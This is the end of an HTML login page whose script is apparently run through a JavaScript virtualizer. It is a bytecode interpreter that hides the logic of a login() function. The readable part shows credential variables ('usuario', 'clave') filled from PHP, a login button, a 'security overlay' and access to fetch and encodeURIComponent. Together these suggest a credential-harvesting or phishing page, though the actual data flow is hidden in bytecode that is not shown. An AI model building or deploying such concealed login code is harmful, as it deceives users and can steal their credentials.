0xfb:{E2:{jq[Cw]=jq[Cw]-0x1,jw++;}break;}case 0xd5:{E3:{ja[jn++]=CY['_$pS9Iwn'],jw++;}break;}case 0xd2:{E4:{let lK=ja[--jn],lQ={['_$Ejew7m']:null,['_$f84dGi']:null,['_$n9ZZux']:null,['_$xQCdVF']:lK};CY['_$pS9Iwn']=lQ,jw++;}break;}case 0x102:{E5:{let lr=Cw&0xffff,lA=Cw>>>0x10,la=ja[--jn],ln=G(C3,la),lq=jq[lr],lw=jJ[lA],lJ=lq[lw];ja[jn++]=lJ['apply'](lq,ln),jw++;}break;}case 0xc8:{E6:{debugger;jw++;}break;}case 0xd6:{E7:{CY['_$pS9Iwn']&&CY['_$pS9Iwn']['_$xQCdVF']&&(CY['_$pS9Iwn']=CY['_$pS9Iwn']['_$xQCdVF']),jw++;}break;}}});switch(CQ){case 0xb:{let Cq=ja[--jn],Cw=ja[--jn];ja[jn++]=Cw-Cq,jw++;continue;}case 0x7:{jq[Cr]=ja[--jn],jw++;continue;}case 0x48:{let CJ=ja[--jn],Cs=ja[--jn];if(Cs===null||Cs===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(CJ)+'\x27\x20of\x20'+Cs);ja[jn++]=Cs[CJ],jw++;continue;}case 0x3:{ja[--jn],jw++;continue;}case 0x34:{!ja[--jn]?jw=jI[jw]:jw++;continue;}case 0xa:{let CI=ja[--jn],CW=ja[--jn];ja[jn++]=CW+CI,jw++;continue;}case 0x2c:{let Cu=ja[--jn],CO=ja[--jn];ja[jn++]=CO<Cu,jw++;continue;}case 0x10:{let Cz=ja[--jn];ja[jn++]=typeof Cz===f?Cz+0x1n:+Cz+0x1,jw++;continue;}case 0x0:{ja[jn++]=jJ[Cr],jw++;continue;}case 0x49:{let Co=ja[--jn],Ct=ja[--jn],Ck=ja[--jn];if(Ck===null||Ck===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(Ct)+'\x27\x20of\x20'+Ck);if(jP){if(!Reflect['set'](Ck,Ct,Co))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(Ct)+'\x27\x20of\x20object');}else Ck[Ct]=Co;ja[jn++]=Co,jw++;continue;}case 0x4:{let CT=ja[jn-0x1];ja[jn++]=CT,jw++;continue;}case 0x8:{ja[jn++]=jF[Cr],jw++;continue;}case 0x32:{jw=jI[jw];continue;}case 0x1c:{let CX=ja[--jn];ja[jn++]=typeof CX===f?CX:+CX,jw++;continue;}case 0x6:{ja[jn++]=jq[Cr],jw++;continue;}case 0x2e:{let CL=ja[--jn],CR=ja[--jn];ja[jn++]=CR>CL,jw++;continue;}case 0x1:{ja[jn++]=undefined,jw++;continue;}}CY=Cx;if(CQ<0x5a){if(Cv(CQ,Cr)){if(Cy>0x0){CG();continue;}return CZ;}}else{if(CQ<0xc8){if(CS(CQ,Cr)){if(Cy>0x0){CG();continue;}return CZ;}}else{if(CD(CQ,Cr)){if(Cy>0x0){CG();continue;}return CZ;}}}C9=Cx['_$pS9Iwn'],Cl=Cx['_$EnCqdU'];}break;}catch(Cm){if(jk&&jk['length']>0x0){let CV=jk[jk['length']-0x1];jn=CV['_$zoO9Bb'];if(CV['_$CDWarX']!==undefined)C2(Cm),jw=CV['_$CDWarX'],CV['_$CDWarX']=undefined,CV['_$9BLmcO']===undefined&&jk['pop']();else CV['_$9BLmcO']!==undefined?(jw=CV['_$9BLmcO'],CV['_$XEwkUm']=Cm):(jw=CV['_$iPzJWv'],jk['pop']());continue;}throw Cm;}}return jn>0x0?ja[--jn]:Cl?jA:undefined;}return Ci(0x0);}function*k(jB,jF,jK,jQ,jr,jA){let ja=t(jB,jF,jK,jQ,jr,jA);while(!![]){if(ja&&typeof ja==='object'&&ja['_$TRB1xK']!==undefined){let jn=ja['_d'],jq;try{jq=yield ja;}catch(jw){ja=jn(0x2,jw);continue;}jq&&typeof jq==='object'&&jq['_$TRB1xK']===y?ja=jn(0x3,jq['_$kc4PA6']):ja=jn(0x1,jq);}else return ja;}}let T=function(jB,jF,jK,jQ,jr,jA){vmg_8e0e94['_$K6W8Lo']?vmg_8e0e94['_$K6W8Lo']=![]:vmg_8e0e94['_$mOUl7D']=undefined;let ja=typeof jB==='object'?jB:jv(jB);return o(ja,jF,jK,jQ,jr,jA);},X=0x0,L=0x1,R=0x2,m=0x3,V=0x4,H=0x5,P=0x6,h=0x7,c=0x8,p=0x9,j0=0xa,j1=0x1,j2=0x2,j3=0x4,j4=0x8,j5=0x20,j6=0x40,j7=0x80,j8=0x100,j9=0x200,jj=0x400,jC=0x800,jl=0x1000,jE=0x2000,jN=0x4000,jy=0x8000,jx=0x10000,ji=0x20000,jg=0x40000,jf=0x80000;function jU(jB){this['_$nl48Jk']=jB,this['_$e955S8']=new DataView(jB['buffer'],jB['byteOffset'],jB['byteLength']),this['_$4EIJeZ']=0x0;}jU['prototype']['_$0LorHr']=function(){return this['_$nl48Jk'][this['_$4EIJeZ']++];},jU['prototype']['_$CJA8Xs']=function(){let jB=this['_$e955S8']['getUint16'](this['_$4EIJeZ'],!![]);return this['_$4EIJeZ']+=0x2,jB;},jU['prototype']['_$KFuWtQ']=function(){let jB=this['_$e955S8']['getUint32'](this['_$4EIJeZ'],!![]);return this['_$4EIJeZ']+=0x4,jB;},jU['prototype']['_$pO56x7']=function(){let jB=this['_$e955S8']['getInt32'](this['_$4EIJeZ'],!![]);return this['_$4EIJeZ']+=0x4,jB;},jU['prototype']['_$WIn2eT']=function(){let jB=this['_$e955S8']['getFloat64'](this['_$4EIJeZ'],!![]);return this['_$4EIJeZ']+=0x8,jB;},jU['prototype']['_$6BPCyf']=function(){let jB=0x0,jF=0x0,jK;do{jK=this['_$0LorHr'](),jB|=(jK&0x7f)<<jF,jF+=0x7;}while(jK>=0x80);return jB>>>0x1^-(jB&0x1);},jU['prototype']['_$TV8Uij']=function(){let jB=this['_$6BPCyf'](),jF=this['_$nl48Jk'],jK=this['_$4EIJeZ'],jQ=jK+jB;this['_$4EIJeZ']=jQ;var jr='';while(jK<jQ){var jA=jF[jK++];if(jA<0x80)jr+=String['fromCharCode'](jA);else{if(jA<0xe0)jr+=String['fromCharCode']((jA&0x1f)<<0x6|jF[jK++]&0x3f);else{if(jA<0xf0)jr+=String['fromCharCode']((jA&0xf)<<0xc|(jF[jK++]&0x3f)<<0x6|jF[jK++]&0x3f);else{var ja=(jA&0x7)<<0x12|(jF[jK++]&0x3f)<<0xc|(jF[jK++]&0x3f)<<0x6|jF[jK++]&0x3f;ja-=0x10000,jr+=String['fromCharCode']((ja>>0xa)+0xd800,(ja&0x3ff)+0xdc00);}}}}return jr;};var jd='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',jM=new Uint8Array(0x80);for(var jb=0x0;jb<jd['length'];jb++){jM[jd['charCodeAt'](jb)]=jb;}function jZ(jB){var jF=jB['charCodeAt'](jB['length']-0x1)===0x3d?jB['charCodeAt'](jB['length']-0x2)===0x3d?0x2:0x1:0x0,jK=(jB['length']*0x3>>0x2)-jF,jQ=new Uint8Array(jK),jr=0x0;for(var jA=0x0;jA<jB['length'];jA+=0x4){var ja=jM[jB['charCodeAt'](jA)],jn=jM[jB['charCodeAt'](jA+0x1)],jq=jM[jB['charCodeAt'](jA+0x2)],jw=jM[jB['charCodeAt'](jA+0x3)];jQ[jr++]=ja<<0x2|jn>>0x4,jr<jK&&(jQ[jr++]=(jn&0xf)<<0x4|jq>>0x2),jr<jK&&(jQ[jr++]=(jq&0x3)<<0x6|jw);}return jQ;}function jY(jB){let jF=jB['_$0LorHr']();switch(jF){case X:return null;case L:return undefined;case R:return![];case m:return!![];case V:{let jK=jB['_$0LorHr']();return jK>0x7f?jK-0x100:jK;}case H:{let jQ=jB['_$CJA8Xs']();return jQ>0x7fff?jQ-0x10000:jQ;}case P:return jB['_$pO56x7']();case h:return jB['_$WIn2eT']();case c:return jB['_$TV8Uij']();case p:return BigInt(jB['_$TV8Uij']());case j0:{let jr=jB['_$TV8Uij'](),jA=jB['_$TV8Uij']();return new RegExp(jr,jA);}default:return null;}}function jG(jB){let jF=typeof jB==='string'?jZ(jB):jB,jK=new jU(jF),jQ=jK['_$0LorHr'](),jr=jK['_$KFuWtQ'](),jA=jK['_$6BPCyf'](),ja=jK['_$6BPCyf'](),jn=[];jn[0x12]=jA,jn[0x11]=ja;jr&j4&&(jn[0x1]=jK['_$6BPCyf']());if(jr&j5){let jz=jK['_$6BPCyf'](),jo={};for(let jt=0x0;jt<jz;jt++){let jk=jK['_$6BPCyf'](),jT=jK['_$6BPCyf']();jo[jk]=jT;}jn[0x14]=jo;}jr&j6&&(jn[0xe]=jK['_$KFuWtQ']());jr&j7&&(jn[0x4]=jK['_$KFuWtQ']());jr&j8&&(jn[0x3]=jK['_$KFuWtQ']());jr&j9&&(jn[0xb]=jK['_$6BPCyf']());jr&jj&&(jn[0x7]=jK['_$KFuWtQ']());jr&jf&&(jn[0xa]=jK['_$6BPCyf']());jr&j1&&(jn[0xc]=0x1);jr&j2&&(jn[0x8]=0x1);jr&j3&&(jn[0xd]=0x1);jr&jN&&(jn[0x0]=0x1);jr&jy&&(jn[0x6]=0x1);jr&jx&&(jn[0x2]=0x1);jr&ji&&(jn[0x5]=0x1);jr&jg&&(jn[0xf]=0x1);jr&jE&&(jn[0x9]=0x1);let jq=jK['_$6BPCyf'](),jw=new Array(jq);for(let jX=0x0;jX<jq;jX++){jw[jX]=jY(jK);}jn[0x15]=jw;function jJ(jL){let jR=jL['_$0LorHr']();switch(jR){case X:return null;case V:{let jm=jL['_$0LorHr']();return jm>0x7f?jm-0x100:jm;}case H:{let jV=jL['_$CJA8Xs']();return jV>0x7fff?jV-0x10000:jV;}case P:return jL['_$pO56x7']();case h:return jL['_$WIn2eT']();case c:return jL['_$TV8Uij']();default:return null;}}let js=jK['_$6BPCyf'](),jI=js<<0x1,jW=new Array(jI),ju=0x0,jO=(jA*0x1f^ja*0x11^js*0xd^jq*0x7)>>>0x0&0x3;switch(jO){case 0x1:for(let jL=0x0;jL<js;jL++){let jR=jJ(jK),jm=jK['_$6BPCyf']();jW[ju++]=jR,jW[ju++]=jm;}break;case 0x2:{let jV=new Array(js);for(let jH=0x0;jH<js;jH++){jV[jH]=jK['_$6BPCyf']();}for(let jP=0x0;jP<js;jP++){jW[ju++]=jV[jP];}for(let je=0x0;je<js;je++){jW[ju++]=jJ(jK);}break;}case 0x3:{let jh=new Array(js);for(let jc=0x0;jc<js;jc++){jh[jc]=jJ(jK);}for(let jp=0x0;jp<js;jp++){jW[ju++]=jh[jp];}for(let C0=0x0;C0<js;C0++){jW[ju++]=jK['_$6BPCyf']();}break;}case 0x0:default:for(let C1=0x0;C1<js;C1++){jW[ju++]=jK['_$6BPCyf'](),jW[ju++]=jJ(jK);}break;}jn[0x13]=jW;if(jr&jC){let C2=jK['_$6BPCyf'](),C3={};for(let C4=0x0;C4<C2;C4++){let C5=jK['_$6BPCyf'](),C6=jK['_$6BPCyf']();C3[C5]=C6;}jn[0x10]=C3;}if(jr&jl){let C7=jK['_$6BPCyf'](),C8={};for(let C9=0x0;C9<C7;C9++){let Cj=jK['_$6BPCyf'](),CC=jK['_$6BPCyf']()-0x1,Cl=jK['_$6BPCyf']()-0x1,CE=jK['_$6BPCyf']()-0x1;C8[Cj]=[CC,Cl,CE];}jn[0x16]=C8;}return jn;}let jv=function(jB){let jF=j;j=null;let jK=null,jQ={};return function(jr){let jA=jK?jK[jr]:jr;if(jQ[jA])return jQ[jA];let ja=jF[jA];return typeof ja==='string'?jQ[jA]=jB(ja):jQ[jA]=ja,jQ[jA];};}(jG),jS=async function(jB,jF,jK,jQ,jr,jA,ja){let jn=typeof jB==='object'?jB:jv(jB),jq=k(jn,jF,jK,jQ,jr,ja),jw=jq['next']();while(!jw['done']){if(jw['value']['_$TRB1xK']!==l)throw new Error('Unexpected\x20yield\x20in\x20async\x20context');try{let jJ=await Promise['resolve'](jw['value']['_$kc4PA6']);vmg_8e0e94['_$mOUl7D']=jA,jw=jq['next'](jJ);}catch(js){vmg_8e0e94['_$mOUl7D']=jA,jw=jq['throw'](js);}}return jw['value'];},jD=function(jB,jF,jK,jQ,jr,jA){let ja=typeof jB==='object'?jB:jv(jB),jn=k(ja,jF,jK,jQ,undefined,jA),jq=![],jw=null,jJ=undefined,js=![];function jI(jt,jk){if(jq)return{'value':undefined,'done':!![]};vmg_8e0e94['_$mOUl7D']=jr;if(jw){let jX;try{if(jk){if(typeof jw['throw']==='function')jX=jw['throw'](jt);else{typeof jw['return']==='function'&&jw['return']();jw=null;throw new TypeError('The\x20iterator\x20does\x20not\x20provide\x20a\x20\x27throw\x27\x20method.');}}else jX=jw['next'](jt);if(jX!==null&&typeof jX==='object'){}else{jw=null;throw new TypeError('Iterator\x20result\x20'+jX+'\x20is\x20not\x20an\x20object');}}catch(jL){jw=null;try{let jR=jn['throw'](jL);return jW(jR);}catch(jm){jq=!![];throw jm;}}if(!jX['done'])return{'value':jX['value'],'done':![]};jw=null,jt=jX['value'],jk=![];}let jT;try{jT=jk?jn['throw'](jt):jn['next'](jt);}catch(jV){jq=!![];throw jV;}return jW(jT);}function jW(jt){if(jt['done']){jq=!![];if(js)return js=![],{'value':jJ,'done':!![]};return{'value':jt['value'],'done':!![]};}let jk=jt['value'];if(jk['_$TRB1xK']===E)return{'value':jk['_$kc4PA6'],'done':![]};if(jk['_$TRB1xK']===N){let jT=jk['_$kc4PA6'],jX=jT;jX&&typeof jX[Symbol['iterator']]==='function'&&(jX=jX[Symbol['iterator']]());if(jX&&typeof jX['next']==='function'){let jL=jX['next']();if(!jL['done'])return jw=jX,{'value':jL['value'],'done':![]};return jI(jL['value'],![]);}return jI(undefined,![]);}throw new Error('Unexpected\x20signal\x20in\x20generator');}let ju=ja&&ja[0x8],jO=async function(jt){if(jq)return{'value':jt,'done':!![]};if(jw&&typeof jw['return']==='function'){try{await jw['return']();}catch(jT){}jw=null;}let jk;try{vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next']({['_$TRB1xK']:y,['_$kc4PA6']:jt});}catch(jX){jq=!![];throw jX;}while(!jk['done']){let jL=jk['value'];if(jL['_$TRB1xK']===l)try{let jR=await Promise['resolve'](jL['_$kc4PA6']);vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next'](jR);}catch(jm){vmg_8e0e94['_$mOUl7D']=jr,jk=jn['throw'](jm);}else{if(jL['_$TRB1xK']===E)try{vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next']();}catch(jV){jq=!![];throw jV;}else break;}}return jq=!![],{'value':jk['value'],'done':!![]};},jz=function(jt){if(jq)return{'value':jt,'done':!![]};if(jw&&typeof jw['return']==='function'){let jT;try{jT=jw['return'](jt);if(jT===null||typeof jT!=='object')throw new TypeError('Iterator\x20result\x20'+jT+'\x20is\x20not\x20an\x20object');}catch(jX){jw=null;let jL;try{jL=jn['throw'](jX);}catch(jR){jq=!![];throw jR;}return jW(jL);}if(!jT['done'])return{'value':jT['value'],'done':![]};jw=null;}jJ=jt,js=!![];let jk;try{vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next']({['_$TRB1xK']:y,['_$kc4PA6']:jt});}catch(jm){jq=!![],js=![];throw jm;}if(!jk['done']&&jk['value']&&jk['value']['_$TRB1xK']===E)return{'value':jk['value']['_$kc4PA6'],'done':![]};return jq=!![],js=![],{'value':jk['value'],'done':!![]};};if(ju){let jt=async function(jk,jT){if(jq)return{'value':undefined,'done':!![]};vmg_8e0e94['_$mOUl7D']=jr;if(jw){let jL;try{jL=jT?typeof jw['throw']==='function'?await jw['throw'](jk):(jw=null,(function(){throw jk;}())):await jw['next'](jk);}catch(jR){jw=null;try{vmg_8e0e94['_$mOUl7D']=jr;let jm=jn['throw'](jR);return await jo(jm);}catch(jV){jq=!![];throw jV;}}if(!jL['done'])return{'value':jL['value'],'done':![]};jw=null,jk=jL['value'],jT=![];}let jX;try{jX=jT?jn['throw'](jk):jn['next'](jk);}catch(jH){jq=!![];throw jH;}return await jo(jX);};async function jo(jk){while(!jk['done']){let jT=jk['value'];if(jT['_$TRB1xK']===l){let jX;try{jX=await Promise['resolve'](jT['_$kc4PA6']),vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next'](jX);}catch(jL){vmg_8e0e94['_$mOUl7D']=jr,jk=jn['throw'](jL);}continue;}if(jT['_$TRB1xK']===E)return{'value':jT['_$kc4PA6'],'done':![]};if(jT['_$TRB1xK']===N){let jR=jT['_$kc4PA6'],jm=jR;if(jm&&typeof jm[Symbol['asyncIterator']]==='function')jm=jm[Symbol['asyncIterator']]();else jm&&typeof jm[Symbol['iterator']]==='function'&&(jm=jm[Symbol['iterator']]());if(jm&&typeof jm['next']==='function'){let jV=await jm['next']();if(!jV['done'])return jw=jm,{'value':jV['value'],'done':![]};vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next'](jV['value']);continue;}vmg_8e0e94['_$mOUl7D']=jr,jk=jn['next'](undefined);continue;}throw new Error('Unexpected\x20signal\x20in\x20async\x20generator');}jq=!![];if(js)return js=![],{'value':jJ,'done':!![]};return{'value':jk['value'],'done':!![]};}return{'next':function(jk){return jt(jk,![]);},'return':jO,'throw':function(jk){if(jq)return Promise['reject'](jk);return jt(jk,!![]);},[Symbol['asyncIterator']]:function(){return this;}};}else return{'next':function(jk){return jI(jk,![]);},'return':jz,'throw':function(jk){if(jq)throw jk;return jI(jk,!![]);},[Symbol['iterator']]:function(){return this;}};};return function(jB,jF,jK,jQ,jr,jA){let ja=jv(jB),jn=jA;if(ja&&ja[0xd]){let jq=vmg_8e0e94['_$mOUl7D'];return jD(ja,jF,jK,jQ,jq,jn);}if(ja&&ja[0x8]){let jw=vmg_8e0e94['_$mOUl7D'];return jS(ja,jF,jK,jQ,jr,jw,jn);}if(ja&&ja[0x6]&&jn===vmd)return T(ja,jF,jK,jQ,jr,undefined);return T(ja,jF,jK,jQ,jr,jn);};}());try{document,Object['defineProperty'](vmg_8e0e94,'document',{'get':function(){return document;},'set':function(j){document=j;},'configurable':!![]});}catch(vmy7){}try{console,Object['defineProperty'](vmg_8e0e94,'console',{'get':function(){return console;},'set':function(j){console=j;},'configurable':!![]});}catch(vmy8){}try{fetch,Object['defineProperty'](vmg_8e0e94,'fetch',{'get':function(){return fetch;},'set':function(j){fetch=j;},'configurable':!![]});}catch(vmy9){}try{encodeURIComponent,Object['defineProperty'](vmg_8e0e94,'encodeURIComponent',{'get':function(){return encodeURIComponent;},'set':function(j){encodeURIComponent=j;},'configurable':!![]});}catch(vmyj){}try{setTimeout,Object['defineProperty'](vmg_8e0e94,'setTimeout',{'get':function(){return setTimeout;},'set':function(j){setTimeout=j;},'configurable':!![]});}catch(vmyC){}try{window,Object['defineProperty'](vmg_8e0e94,'window',{'get':function(){return window;},'set':function(j){window=j;},'configurable':!![]});}catch(vmyl){}vmg_8e0e94['login']=login;globalThis['login']=vmg_8e0e94['login'];vmg_8e0e94['_$Y9dSnQ']={'usuario':!![],'clave':!![],'userInput':!![],'loginBtn':!![],'overlay':!![],'running':!![]};let usuario='<?php\x20echo\x20$usuario;\x20?>';vmg_8e0e94['usuario']=usuario;globalThis['usuario']=vmg_8e0e94['usuario'];vmg_8e0e94['usuario']=usuario;globalThis['usuario']=usuario;delete vmg_8e0e94['_$Y9dSnQ']['usuario'];let clave='<?php\x20echo\x20$clave;\x20?>';vmg_8e0e94['clave']=clave;globalThis['clave']=vmg_8e0e94['clave'];vmg_8e0e94['clave']=clave;globalThis['clave']=clave;delete vmg_8e0e94['_$Y9dSnQ']['clave'];const userInput=document['querySelector']('input[type=\x22text\x22]');vmg_8e0e94['userInput']=userInput;globalThis['userInput']=vmg_8e0e94['userInput'];vmg_8e0e94['userInput']=userInput;globalThis['userInput']=userInput;delete vmg_8e0e94['_$Y9dSnQ']['userInput'];const loginBtn=document['getElementById']('loginBtn');vmg_8e0e94['loginBtn']=loginBtn;globalThis['loginBtn']=vmg_8e0e94['loginBtn'];vmg_8e0e94['loginBtn']=loginBtn;globalThis['loginBtn']=loginBtn;delete vmg_8e0e94['_$Y9dSnQ']['loginBtn'];const overlay=document['getElementById']('securityOverlay');vmg_8e0e94['overlay']=overlay;globalThis['overlay']=vmg_8e0e94['overlay'];vmg_8e0e94['overlay']=overlay;globalThis['overlay']=overlay;delete vmg_8e0e94['_$Y9dSnQ']['overlay'];let running=![];vmg_8e0e94['running']=running;globalThis['running']=vmg_8e0e94['running'];vmg_8e0e94['running']=running;globalThis['running']=running;delete vmg_8e0e94['_$Y9dSnQ']['running'],userInput['addEventListener']('input',function(){return vmN_22d42c(0x0,Array['from'](arguments),{['_$xQCdVF']:undefined,['_$Ejew7m']:{'userInput':userInput,'loginBtn':loginBtn},['_$f84dGi']:{['userInput']:!![],['loginBtn']:!![]}},undefined,new.target,this);});async function login(){return vmN_22d42c(0x6,Array['from'](arguments),{['_$xQCdVF']:undefined,['_$Ejew7m']:Object['defineProperties']({'overlay':overlay},{['usuario']:{'get':function(){return usuario;},'set':function(j){usuario=j;},'enumerable':!![]},['clave']:{'get':function(){return clave;},'set':function(j){clave=j;},'enumerable':!![]},['running']:{'get':function(){return running;},'set':function(j){running=j;},'enumerable':!![]}}),['_$f84dGi']:{['overlay']:!![]}},undefined,new.target,this);}
     </script>

</body>
</html>
